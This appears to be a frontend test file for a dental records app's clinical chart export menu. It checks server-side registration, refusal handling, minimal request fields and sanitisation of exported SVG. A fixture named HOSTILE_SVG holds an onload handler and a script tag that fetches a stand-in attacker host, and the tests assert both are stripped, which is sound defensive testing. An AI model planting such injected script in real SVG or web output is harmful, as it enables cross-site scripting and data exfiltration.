// @vitest-environment jsdom

import * as React from "react";

import { cleanup, render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

const { recordClinicalExportAction } = vi.hoisted(() => ({
  recordClinicalExportAction: vi.fn(),
}));

vi.mock("@/app/(emr)/patients/[patientId]/odontogram-interchange-actions", () => ({
  recordClinicalExportAction,
}));

import { ClinicalExportMenu } from "./clinical-export-menu";

const patientId = "22222222-2222-4222-8222-222222222222";
const branchId = "11111111-1111-4111-8111-111111111111";

const HOSTILE_SVG = [
  '<svg xmlns="http://www.w3.org/2000/svg" width="900" height="400" onload="steal()">',
  "<script>fetch('https://attacker.example')</script>",
  '<image xlink:href="https://storage.example/signed?X-Amz-Signature=deadbeef" />',
  '<rect x="1" y="1" width="2" height="2" />',
  "</svg>",
].join("");

const objectUrls: { blob: Blob; url: string }[] = [];
const downloads: { filename: string; href: string }[] = [];

function registered(overrides: Record<string, unknown> = {}) {
  return {
    ok: true,
    filename: "clinical-chart-P000123-2026-09-01.json",
    contentType: "application/fhir+json",
    contentDisposition: 'attachment; filename="clinical-chart-P000123-2026-09-01.json"',
    body: '{"resourceType":"Bundle"}',
    ...overrides,
  };
}

beforeEach(() => {
  recordClinicalExportAction.mockReset();
  objectUrls.length = 0;
  downloads.length = 0;
  vi.stubGlobal("URL", {
    ...URL,
    createObjectURL: (blob: Blob) => {
      const url = `blob:synthetic/${objectUrls.length}`;
      objectUrls.push({ blob, url });
      return url;
    },
    revokeObjectURL: () => {},
  });
  vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(function click(
    this: HTMLAnchorElement,
  ) {
    downloads.push({ filename: this.download, href: this.href });
  });
});

afterEach(() => {
  cleanup();
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

async function openMenu() {
  const user = userEvent.setup();
  render(
    <ClinicalExportMenu
      patientId={patientId}
      branchId={branchId}
      getChartSvg={() => HOSTILE_SVG}
      onPrint={onPrint}
    />,
  );
  await user.click(screen.getByRole("button", { name: /Export chart/ }));
  return user;
}

const onPrint = vi.fn();

describe("ClinicalExportMenu", () => {
  it("offers the five authorized formats behind one control", async () => {
    const user = await openMenu();
    for (const label of [
      "FHIR R4 Bundle",
      "Dental EMR JSON",
      "Chart image (SVG)",
      "Chart image (PNG)",
      "Print or save as PDF",
    ]) {
      expect(await screen.findByRole("menuitem", { name: label })).toBeInTheDocument();
    }
    expect(user).toBeTruthy();
  });

  it("registers the export server-side before it produces anything to download", async () => {
    recordClinicalExportAction.mockResolvedValue(registered());
    const user = await openMenu();

    await user.click(await screen.findByRole("menuitem", { name: "FHIR R4 Bundle" }));

    expect(recordClinicalExportAction).toHaveBeenCalledWith(
      expect.objectContaining({
        branchId,
        patientId,
        format: "FHIR_R4_BUNDLE",
        scope: "CHART_AND_PROGRESS",
      }),
    );
    expect(downloads).toHaveLength(1);
    expect(downloads[0].filename).toBe("clinical-chart-P000123-2026-09-01.json");
  });

  it("creates no download at all when registration is refused", async () => {
    recordClinicalExportAction.mockResolvedValue({ ok: false, code: "NOT_AUTHORIZED" });
    const user = await openMenu();

    await user.click(await screen.findByRole("menuitem", { name: "FHIR R4 Bundle" }));

    expect(objectUrls).toHaveLength(0);
    expect(downloads).toHaveLength(0);
    expect(await screen.findByRole("alert")).toHaveTextContent(/access or selected branch changed/);
  });

  it("sends no organization, provider or author identity with the request", async () => {
    recordClinicalExportAction.mockResolvedValue(registered());
    const user = await openMenu();
    await user.click(await screen.findByRole("menuitem", { name: "Dental EMR JSON" }));

    const [request] = recordClinicalExportAction.mock.calls[0];
    expect(Object.keys(request).sort()).toEqual([
      "branchId",
      "format",
      "idempotencyKey",
      "patientId",
      "scope",
    ]);
  });

  it("exports the sanitized closed-renderer SVG and never a signed media URL", async () => {
    recordClinicalExportAction.mockResolvedValue(
      registered({ filename: "clinical-chart-P000123-2026-09-01.svg", contentType: "image/svg+xml", body: null }),
    );
    const user = await openMenu();

    await user.click(await screen.findByRole("menuitem", { name: "Chart image (SVG)" }));

    expect(objectUrls).toHaveLength(1);
    const exported = await objectUrls[0].blob.text();
    expect(exported).toContain("<rect");
    expect(exported).not.toContain("X-Amz-Signature");
    expect(exported).not.toContain("attacker.example");
    expect(exported).not.toContain("storage.example");
    expect(exported).not.toMatch(/\son[a-z]+\s*=/i);
    expect(exported).not.toContain("<script");
    expect(downloads[0].filename).toBe("clinical-chart-P000123-2026-09-01.svg");
  });

  it("registers the print export before opening the print surface", async () => {
    onPrint.mockClear();
    recordClinicalExportAction.mockResolvedValue(
      registered({ filename: "clinical-chart-P000123-2026-09-01.pdf", contentType: "application/pdf", body: null }),
    );
    const user = await openMenu();

    await user.click(await screen.findByRole("menuitem", { name: "Print or save as PDF" }));

    expect(recordClinicalExportAction).toHaveBeenCalledWith(
      expect.objectContaining({ format: "PDF" }),
    );
    expect(onPrint).toHaveBeenCalledTimes(1);
    expect(downloads).toHaveLength(0);
  });

  it("says so rather than exporting an empty picture when the chart is not on screen", async () => {
    recordClinicalExportAction.mockResolvedValue(
      registered({ filename: "clinical-chart-P000123-2026-09-01.svg", contentType: "image/svg+xml", body: null }),
    );
    const user = userEvent.setup();
    render(<ClinicalExportMenu patientId={patientId} branchId={branchId} />);
    await user.click(screen.getByRole("button", { name: /Export chart/ }));
    await user.click(await screen.findByRole("menuitem", { name: "Chart image (SVG)" }));

    expect(objectUrls).toHaveLength(0);
    expect(await screen.findByRole("alert")).toHaveTextContent(/not on screen/);
  });
});
